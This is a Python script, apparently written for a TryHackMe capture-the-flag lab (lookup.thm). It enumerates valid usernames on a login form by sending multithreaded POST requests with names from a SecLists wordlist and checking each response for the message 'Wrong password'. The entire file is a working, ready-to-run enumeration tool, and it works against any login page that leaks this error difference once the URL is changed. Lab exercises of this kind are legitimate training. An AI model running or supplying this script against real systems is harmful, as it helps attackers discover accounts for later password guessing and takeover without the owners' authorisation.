import requests          
import threading         
from queue import Queue  
import sys               
import time              

# Define the target URL - this is the login form
url = "http://lookup.thm"

# Define the file path containing usernames
file_path = "/usr/share/seclists/Usernames/Names/names.txt"  # names.txt has ~10k names 

# Initialize shared resources
queue = Queue()            # Queue for usernames
found_usernames = []       # List to store found usernames
lock = threading.Lock()    # Lock for shared resource updates
sem = threading.Semaphore(10)  # Limit to 10 concurrent threads 

# Worker function - processes usernames
def worker(start_time):
    while not queue.empty():
        username = queue.get()  # Get a username from the queue
        data = {
            "username": username,
            "password": "password"  # Example password to test usernames
        }
        try:
            sem.acquire()  # Acquire the semaphore
            response = requests.post(url, data=data, timeout=5)  # Send POST request
            if "Wrong password" in response.text:  # Valid username detected
                with lock:
                    found_usernames.append(username)
            with lock:
                elapsed_time = time.time() - start_time  # Calculate elapsed time
                sys.stdout.write(
                    f"\r[*] Tried: {total_usernames - queue.qsize()} / {total_usernames}, "
                    f"Last username: {username.ljust(20)}, "
                    f"Elapsed time: {elapsed_time:.2f}s"
                )
                sys.stdout.flush()  # Update the console dynamically
        except requests.RequestException:
            pass  # Ignore request exceptions to continue processing
        finally:
            sem.release()  # Release the semaphore
            queue.task_done()  # Mark the task as done


try:
    # Read usernames from file into the queue
    print(f"[*] Reading usernames from {file_path}...")
    with open(file_path, "r") as file:
        for line in file:
            username = line.strip()
            if username:
                queue.put(username)  # Add username to the queue

    total_usernames = queue.qsize()  # Get the total number of usernames
    print(f"[*] Loaded {total_usernames} usernames. Starting enumeration...\n") 

    # Start tracking time
    start_time = time.time()  

    threads = []
    for _ in range(10):  # 10 threads
        thread = threading.Thread(target=worker, args=(start_time,))
        thread.start()
        threads.append(thread)

    # Wait for all threads to finish
    for thread in threads:
        thread.join()

    # Display results - once all tasks are finished
    print(f"\n[*] Finished processing {total_usernames} usernames in {time.time() - start_time:.2f}s.")
    if found_usernames:
        print("[+] Found valid usernames:")
        for username in found_usernames:
            print(f"    - {username}")
    else:
        print("[-] No valid usernames found.")

except FileNotFoundError:
    print(f"Error: The file {file_path} does not exist. Double-check your file path.")
except KeyboardInterrupt:
    print("\n[-] Script interrupted by user. Exiting.")
